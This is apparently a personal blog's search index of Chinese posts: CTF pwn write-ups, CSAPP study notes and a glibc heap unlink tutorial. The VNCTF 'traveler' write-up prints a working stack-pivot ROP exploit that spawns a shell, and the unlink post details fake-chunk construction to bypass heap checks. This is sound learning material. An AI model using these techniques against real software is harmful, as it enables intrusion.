<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023LitCTF</title>
    <url>/2023/05/13/2023LitCTF/</url>
    <content><![CDATA[<h1 id="周末参加个Litctf"><a href="#周末参加个Litctf" class="headerlink" title="周末参加个Litctf"></a>周末参加个Litctf</h1><p>然后发现了自己对堆栈的知识还是不太熟练，看来暑假有的忙活的啦。（之前只顾着赶进度，堆理论，没有太注意刷题了，导致看到题目，虽然找到了明显的漏洞，但却不会利用）所以就只做了两道签到题。&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<h2 id="1-只需要nc一下："><a href="#1-只需要nc一下：" class="headerlink" title="1. 只需要nc一下："></a>1. 只需要nc一下：</h2><p>这道题看上去很简单，实际上也确实很简单。(<code>*^_^*</code>)<br>先按照题目所给提示去nc一下：<br>题目告诉你这是一个虚拟终端，然后一个Dokerfile文件，然后当你cat一下之后看到Dockerfile的内容是把一个flag写入环境变量中：</p>
<img src = https://s2.loli.net/2023/05/14/yw27A9YJDFbNKWz.png tal = "Dockerfile的内容">

<p>所以使用env命令查看环境变量。直接看到flag：</p>
<img src = https://s2.loli.net/2023/05/14/NpkiXq6mtJLsQjR.png>

<hr>
<h2 id="2-口算题卡"><a href="#2-口算题卡" class="headerlink" title="2. 口算题卡"></a>2. 口算题卡</h2><p>这道题是经典的游戏题，只要答对一百道算数题就能得到flag，当然可以使用人肉爆解啦，但作为一个pwn手，肯定不能爆解啦，直接把flag附上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28634</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;fun!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">105</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;What is &#x27;</span>)</span><br><span class="line">    a=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    operater=io.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    b=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;?\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    <span class="keyword">if</span>(operater==<span class="string">b&#x27;+&#x27;</span>):</span><br><span class="line">        ans = a+b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ans = a-b</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    io.send(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Correct!\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个还是个比较简单的游戏题，毕竟只有加减法。</p>
<hr>
<p>比赛就只写出这两道题了，第三道说实话真不难，但就是出不来，静态调试和动态调试的结果不一样。</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>以下纯属个人心里独白，大家可以直接退出了。</p>
<p>这次是作为网特成员参加的第一次正式的比赛（D3那次就算了，纯属陪跑），但这第一次的出征并不完美，pwn题总体难度其实并不大，但没有ak，只做了两道水题，这个是应该我好好反省的，每天看似忙忙碌碌，最后一比赛，所有的问题都暴露：对于pwntools使用不熟练、python各种变量类型转换不熟悉、局部变量在栈上存储不了解、面对静态和动态调试不相等时的窘迫……其实这与我之前的学习侧重点有关，师兄很早之前就跟我说要多刷点题，但对于刷题我还是并没有太放心上，导致了这次比赛发现了漏洞，却不会利用。但问题暴露了就是个好事，希望下次比赛能拿出自己最好的状态。（暑假的时候也应该好好的刷刷题目）</p>
]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023VNCTF-traveler</title>
    <url>/2023/05/12/2023VNCTF-traveler/</url>
    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。

<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>

<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Lesson 1</title>
    <url>/2023/05/07/CSAPP-Lesson-1/</url>
    <content><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr>
<p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
<h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><p>今天看CSAPP的第一课，虽然中间的大部分时间是讲学术诚信，对于我个上网课的没什么启发，但其中教授抛出的一个问题还是很适合我的思考，这里写下来，希望在学成之后对这个问题能有更好的理解。</p>
<ol>
<li>问题：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i&lt; <span class="number">2048</span> ; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">2048</span> ; j++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt; <span class="number">2048</span> ; j++)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">2048</span> ; i++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<ol start="2">
<li>分析：</li>
</ol>
<p>对于这两个小函数，看似在实现的逻辑上是一致的：都是把dst[i][j]值赋值给src[i][j]的值，但是在具体的代码实现上。却是相差了20倍!</p>
<img src="https://s2.loli.net/2023/05/10/sBdKATDCnHaQIxl.png" alt="Lesson 1 question.png">

<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
<hr>
<img src="https://s2.loli.net/2023/05/10/Ql5vHAE4mKo9cqw.png" alt="Lesson 1 explanation.png">

<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
<hr>
<ol start="3">
<li>总结及个人猜想：</li>
</ol>
<p><font size = 2>总结：Lesson 1是开课的第一节，大概地讲授了课程的重要性以及课程的大概安排，其中的这个问题让我产生了思考，但因为写下这些的时候，笔者仅仅是刚开始的小白，而这也只是一个现在自己的猜测，同时也是写给未来的自己看的。所以在语言以及思考上都是有不足的。</p>
<p><font face="楷体"><del>个人的猜想：笔者个人认为之所以产生这样的差距是因为二维数组在储存方式上的特点所导致的:二维数组的储存是先固定第一位再排序第二位（即先固定array[i][j]中的i，然后再进行j的输入）。</del></font></font></p>
<img src="https://s2.loli.net/2023/05/10/OUK7bZvfzFwgB9l.png" alt="Answer about array">

<p><font face ="隶书" size = 1>这个是来自我的猜想，看看学成归来会有什么新的体会以及修正</font></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lesson-2</title>
    <url>/2023/05/12/CSAPP-Lesson-2/</url>
    <content><![CDATA[<h1 id="Gist-of-Lesson-2"><a href="#Gist-of-Lesson-2" class="headerlink" title="Gist of Lesson 2"></a><strong>Gist of Lesson 2</strong></h1><hr>
<p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
<h2 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h2><hr>
<h3 id="1-字长"><a href="#1-字长" class="headerlink" title="1.字长"></a>1.字长</h3><p>对于一位pwn手而言，在面对不同的程序进行攻击时，第一件关心的事情就是它是几位的程序（即其字长是多少）。所以对不同位数的程序，不同的字长就意味着你应该覆盖多长字节的数据。<br>这是摘自百度的解释：</p>
<p><code>字长是CPU的主要技术指标之一，指的是CPU一次能并行处理的二进制位数，字长总是8的整数倍，通常PC机的字长为16位（早期），32位，64位。</code></p>
<p>这里是来自CSAPP的截图，旨在告诉我们面对不同的程序，其变量类型不同时，对应的长度为多少：</p>
<img src="https://s2.loli.net/2023/05/12/6GspVDlKqwFMncU.png" alt="CSAPP字长">
[*<font size=1>图片来自B站UP主 刘迪望 的转载视频</font>*](https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click)
---

<h3 id="2-不同操作运算符的理解"><a href="#2-不同操作运算符的理解" class="headerlink" title="2.不同操作运算符的理解"></a>2.不同操作运算符的理解</h3><p>在这一段中，我们看到了不同运算符在集合中的用法<br><img src="https://s2.loli.net/2023/05/12/gPukATaMKCS81ym.png" alt="CSAPP运算符的理解"><br><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
<p>基本四种运算符：<font size =4 color = orange>&amp;</font>（and）运算符是集合的交运算； <font size =4 color = orange>|</font>（or）运算符是集合的并运算； <font size =4 color = orange>^</font>（X-or）运算符是集合的对称差运算,而最后<font size =4 color = orange>~</font>运算符是集合的补集。其实这里让我想到了汇编指令中一般清零一个变量一般都不会用<code>mov rax 0</code>这样去清零，一般都是利用<code>xor rax rax</code>异或运算经行清零，这样会比直接赋值快。<br>然而正当我百度去看看异或还有什么骚操作时，果真还有：</p>
<hr>
<p>异或骚操作：<br>摘录自：<a href="https://blog.csdn.net/weixin_27010489/article/details/117190163">https://blog.csdn.net/weixin_27010489/article/details/117190163</a></p>
<p><FONT face = 楷体 >能不能不引入其他变量就可以实现变量值的交换呢？答案是肯定的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a,b;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">a = a^b; <span class="comment">//(1)</span></span><br><span class="line">b = a^b; <span class="comment">//(2)</span></span><br><span class="line">a = a^b; <span class="comment">//(3)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>证明如下：</p>
<p>前提条件：异或操作满足结合律和交换律，且由异或操作的性质知道，对于任意一个整数a^a&#x3D;0；</p>
<p>证：(第(2)步中的a) a &#x3D; a^b &#x3D; (将第(1)步中的b代入b) a^(a^b) &#x3D; b;</p>
<p>(第(3)步中的b)b &#x3D; a^b &#x3D; (将第(1)步中的b代入b，将第(2)步中的a代入a) a^b^a^a^b &#x3D; a^a^a^b^b &#x3D; a;</p>
<p>证毕（优雅，真的太优雅了）</p>
<p></FONT><img src =https://s2.loli.net/2023/05/12/OGCgRKjlSpIXvid.jpg width = 300></img></p>
<hr>
<p>小贴士：<br><img src = https://s2.loli.net/2023/05/12/ljK7qSfWre6y9s4.png tal = 空指针的判断><br><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
<p>（这个空指针的判断也同样的优雅，如果地址p或者是p的值是空的直接成0，然后就是短路）真的太棒了（但是漏洞利用的姿势又少了&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
<hr>
<h3 id="3-补码"><a href="#3-补码" class="headerlink" title="3.补码"></a>3.补码</h3><p>这里对补码的讲述个人认为实在是通透精彩。以往我们的课本只会讲补码是怎么转换，但并没有讲其实际的意义（也有可能讲的时候我开小差了吧(●’◡’●)）。</p>
<p>在讲补码运算之前，先把补码范围的图放一下：<br><IMG SRC = https://s2.loli.net/2023/05/15/oAE2Th4SrXQgbpd.png></p>
<p><FONT SIZE = 2 FACE = "楷体">请大家仔细阅读上面的这张图片，会更好的帮助你理解补码的表示。</FONT></p>
<p>我又参考了一下国内的教材，好像是利用钟表这个比喻来解释补码是什么：</p>
<p>个人参考了这篇博客，个人觉得讲的还是挺通俗的。（<a href="https://www.cnblogs.com/zhangziqiu/archive/2011/03/30/ComputerCode.html%EF%BC%89">https://www.cnblogs.com/zhangziqiu/archive/2011/03/30/ComputerCode.html）</a></p>
<p>在CMU课堂上，老师利用了一个更容易理解的方式来告诉我们一个补码到底是如何表示一个负数，这里是我的一点总结，如果想学的更细的小伙伴可以去看<a herf = "https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click">CMU的原视频</a></p>
<img src = https://s2.loli.net/2023/05/15/Uai2s9ynRPzEJxq.png>

<p>当一个n位二进制数是以补码形式表示时，其最高位n已经不再表示为2^（n-1），而是表示为-（2^（n-1）），然后再进行转换。</p>
<hr>
<h3 id="4-unsigned和signed数字的处理"><a href="#4-unsigned和signed数字的处理" class="headerlink" title="4.unsigned和signed数字的处理"></a>4.unsigned和signed数字的处理</h3><p>Rules：在进行两个数的大小比较时，如果两个数的类型不一样（一个是signed，另一个是unsigned）那么要将符号数转化位无符号数再进行操作。</p>
<p>这里利用一个小程序帮助大家进行理解：<br><IMG SRC = https://s2.loli.net/2023/05/15/t5ihFkmrE1cMlbe.png></p>
<p>如果从我们大家理解的角度下看a&#x3D;-1，b&#x3D;0，在进行a &lt; b 的比较时，应该是返回1（表示正确的），但这里却显示为0。这里就很好的展示了unsigned和signed之间的转换。</p>
<p>对于signed int a而言，其表示为1111 1111</p>
<p>对于unsigned int b而言，其表示为0000 0000</p>
<p>此时进行a、b之间的比较，因为他们类型不同，所以把signed int当成unsigned进行比较，很明显，此时对于a（1111 1111）是为unsigned int中的最大值。所以1111 1111 &lt; 0000 0000是错误的，所以返回值为0。</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello world</title>
    <url>/2023/05/07/hello-world/</url>
    <content><![CDATA[<table><tr><td bgcolor=#f7ff05><font size = 10 face ="黑体" color = "red">破壳第一天</font></td></tr></table>

<p>欢迎来到<font size =4 color = "orange">KJ</font>的博客世界，我将会在这里更新有关于计算机的知识以及日常的生活，欢迎大家来看我的blog。</p>
<h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><font size = 5 face = 楷体 color = red >特别鸣谢：</font></h1><p>标志设计来自：sea blue blue<br><img src = https://s2.loli.net/2023/05/09/qMPQ4ScXBnsJZoH.png></p>
]]></content>
  </entry>
  <entry>
    <title>unlink的利用</title>
    <url>/2023/06/10/unlink%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p><font size=5>Unlink的检测以及漏洞利用</font></p>
<p>这个本来是五一期间就该搞的，之后因为一堆事儿，耽搁了再耽搁。现在想了想再拖下去，我都快忘光了，不如赶紧总结先，所以现在先用博客的方式先记录一下。之后再录个屏，发布到我的B站账号上。</p>
<hr>
<p>首先先了解unlink是什么，这里先附上<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">CTFWiki</a>的解释，后文也会有鄙人的一些理解</p>
<p>这个是我在学习过程中自己制作的<a href="https://s2.loli.net/2023/06/10/d7lXR5ceYmJfg1i.png">流程图</a>，我后文的思路就是按照这个流程图进行讲解的。</p>
<hr>
<h1 id="一、unlink的过程及其检测"><a href="#一、unlink的过程及其检测" class="headerlink" title="一、unlink的过程及其检测 :"></a>一、unlink的过程及其检测 :</h1><p><font size =1 color = red>之前看了网上很多的博客，在写这种公式论证的时候，不太注意加取地址运算符和指针运算符，故在这里我用*(指针运算符)表示该地址存放的值，&amp;(取地址运算符)表示地址值</font></p>
<p>假设有一个chunk，我们命名为P，其前一个chunk命名为FD(forward)，其后一个chunk命名为BK(backward)。</p>
<img src="https://s2.loli.net/2023/06/10/HTM8gElu4aVXkKe.png" alt="unlink的过程及其检测.png">

<h2 id="1-目的-："><a href="#1-目的-：" class="headerlink" title="1.目的 ："></a>1.目的 ：</h2><pre><code>    使前后free掉的chunk合并，空间的利用实现最大化。
</code></pre>
<h2 id="2-条件-："><a href="#2-条件-：" class="headerlink" title="2.条件 ："></a>2.条件 ：</h2><pre><code>1.在unsorted bins中,有两个物理相邻的free chunk(P和BK)，此时先free掉BK这一个chunk后，便触发unlink机制。
2.要有如uaf的漏洞，能对chunk-P上的fd和bk指针进行修改。
</code></pre>
<h2 id="3-检测-："><a href="#3-检测-：" class="headerlink" title="3.检测 ："></a>3.检测 ：</h2><pre><code>unlink的检测很简单(这里的unlink检测指的是在unlink前的检测，不是检查是否能够进行unlink的检测)，总结下来就两步：
    1.检测BK.fd是否等于P的地址，既*(BK.fd)=*(&amp;BK+0x10)==&amp;P
    2.检测FD.bk是否等于P的地址，既*(FD.bk)=*(&amp;FD+0x18)==&amp;P
说人话就是检查后一个chunk中的fd指针是否指向P的地址，前一个chunk中的bk指针是否指向P的地址。
</code></pre>
<h2 id="4-过程-："><a href="#4-过程-：" class="headerlink" title="4.过程 ："></a>4.过程 ：</h2><font size =3>
通过以下这两步进行unlink:

<pre><code>1. *(FD.bk) = &amp;BK
2. *(BK.fd) = &amp;FD 
</code></pre>
<p>相当于链表的删去<br><font size = 2 color =red></p>
<p>Tips：这里要十分注意此时赋值的先后顺序，是先让 *(FD.bk)&#x3D;&amp;BK 后再令 *(BK.fd)&#x3D;&amp;FD<br></font></p>
<h1 id="二、unlink的绕过"><a href="#二、unlink的绕过" class="headerlink" title="二、unlink的绕过 :"></a>二、unlink的绕过 :</h1><p>所以我们应该如何绕过unlink的检测呢？这里就不得不佩服发现这个漏洞的师傅了。我们想到，既然检测只是检测FD.bk、BK.fd的值是否与P的地址相等，并不是检查这几个chunk是否真实存在。那么我们有没有可能通过伪造一个chunk绕过unlink的检验呢？</p>
<img src="https://s2.loli.net/2023/06/15/qLEWBHwX9VfSgUv.png" alt="unlink的利用.png">
<font size =1 face="楷体">这个是我根据unlink的过程总结出来的图，建议大家边看图便理解我的文字。</font>

<p>答案当然是可以啦。</p>
<h2 id="1-构造fake-chunk"><a href="#1-构造fake-chunk" class="headerlink" title="1.构造fake chunk :"></a>1.构造fake chunk :</h2><p>这个漏洞的姿势难理解就是在这个fake chunk的构建上，希望大家做好准备了。发车！！！<img src = https://s2.loli.net/2023/06/15/nyL863clZoGUhdQ.gif></p>
<p>首先，我们要利用漏洞修改P上的fd和bk指针。使得修改后形成这样的一个结构(fake_chunk)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00 : (anything)</span><br><span class="line">0x08 : pre_size</span><br><span class="line">0x10 : size</span><br><span class="line">0x18 : &amp;P</span><br><span class="line">0x20 : (anything)</span><br><span class="line">0x28 : &amp;fake_chunk(0x18) - 0x18</span><br><span class="line">0x30 : &amp;fake_chunk(0x18) - 0x10</span><br></pre></td></tr></table></figure>

<p>经过我们的构造之后，此时的P是我们的fake_chunk(0x18)。</p>
<h2 id="2-我们来看看到底成功与否"><a href="#2-我们来看看到底成功与否" class="headerlink" title="2.我们来看看到底成功与否 :"></a>2.我们来看看到底成功与否 :</h2><p>构建了那么一个fake_chunk，我们已经完成了unlink检验的绕过。不信？来，我们按照unlink检测的过程来检测一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两步：</span><br><span class="line">        1.检测BK.fd是否等于P的地址，既*(BK.fd)=*(&amp;BK+0x10)==&amp;P</span><br><span class="line">        2.检测FD.bk是否等于P的地址，既*(FD.bk)=*(&amp;FD+0x18)==&amp;P</span><br></pre></td></tr></table></figure>

<p>我们先看它的bk指针(0x30 : &amp;fake_chunk(0x18) - 0x10)指向的是0x08，这时候同理，系统也会“反应说” ：“哦，原来0x08这个地方是P的BK。行，我记住了。”</p>
<p>然后它的fd指针(0x28 : &amp;fake_chunk(0x18) - 0x18)指向的是0x00，这时候系统会“说” ：“哦，原来0x00这个地方是P的FD。行，我记住了。”</p>
<p>然后系统说，P的FD和BK都找到了。行，我们开始检测吧！</p>
<p>先看BK的fd，BK.fd(&amp;BK + 0x10 &#x3D; 0x08 + 0x10)是(0x18 : &amp;P)。嗯，不错，确实是P的地址，满足*(BK.fd)&#x3D;*(&amp;BK+0x10)&#x3D;&#x3D;&amp;P。</p>
<p>再看FD的bk，FD.bk(&amp;FD + 0X18 &#x3D;0X00 + 0X18)是(0x18 : &amp;P)。嗯，不错，确实是P的地址，满足*(FD.bk)&#x3D;*(&amp;FD+0x18)&#x3D;&#x3D;&amp;P。</p>
<p>经过了对BK.fd和FD.bk的检查，我们的系统成功被我们蒙骗。我们成功绕过了unlink前的检测。</p>
<h1 id="三、unlink之后chunk的情况"><a href="#三、unlink之后chunk的情况" class="headerlink" title="三、unlink之后chunk的情况 :"></a>三、unlink之后chunk的情况 :</h1><p>此时我们已经成功的绕过了unlink的检测，此时要进行unlink操作了。</p>
<p>unlink的步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">共为两步：</span><br><span class="line">    1. *(FD.bk) = &amp;BK</span><br><span class="line">    2. *(BK.fd) = &amp;FD </span><br></pre></td></tr></table></figure>

<p>此时不管是*(FD.bk)和*(BK.fd)此时都指向地址(0x18 : &amp;P)，所以这时候我们上面所提到的赋值的先后顺序就很重要了。</p>
<p>这时候的堆上的空间情况为：</p>
<p>第一步 (*(FD.bk) &#x3D; &amp;BK)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00 : (anything)</span><br><span class="line">0x08 : pre_size</span><br><span class="line">0x10 : size</span><br><span class="line">0x18 : &amp;P -&gt; 变成 0x08</span><br><span class="line">0x20 : (anything)</span><br><span class="line">0x28 : &amp;fake_chunk(0x18) - 0x18</span><br><span class="line">0x30 : &amp;fake_chunk(0x18) - 0x10</span><br></pre></td></tr></table></figure>

<p>第二步 (*(BK.fd) &#x3D; &amp;FD)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00 : (anything)</span><br><span class="line">0x08 : pre_size</span><br><span class="line">0x10 : size</span><br><span class="line">0x18 : 0x08 -&gt; 变成 0x00</span><br><span class="line">0x20 : (anything)</span><br><span class="line">0x28 : &amp;fake_chunk(0x18) - 0x18</span><br><span class="line">0x30 : &amp;fake_chunk(0x18) - 0x10</span><br></pre></td></tr></table></figure>

<p>所以，这时候的chunk结构为：</p>
<img src = https://s2.loli.net/2023/06/15/K6Xzh4CWoEUScQY.png alt="unlink后的chunk结构.png">

<p>到这里我们已经成功了绕过了unlink的检测，那么这个漏洞能让我们干什么大事呢？</p>
<img src = https://s2.loli.net/2023/06/17/VX4PtmSb3F8o7YR.gif width =200>

]]></content>
      <categories>
        <category>-pwn学习</category>
      </categories>
      <tags>
        <tag>-pwn -堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>高数</title>
    <url>/2023/06/18/%E9%AB%98%E6%95%B0/</url>
    <content><![CDATA[<p>解压密码为：g405hun4n</p>
]]></content>
      <categories>
        <category>-高数学习</category>
      </categories>
      <tags>
        <tag>-高数学习</tag>
      </tags>
  </entry>
</search>
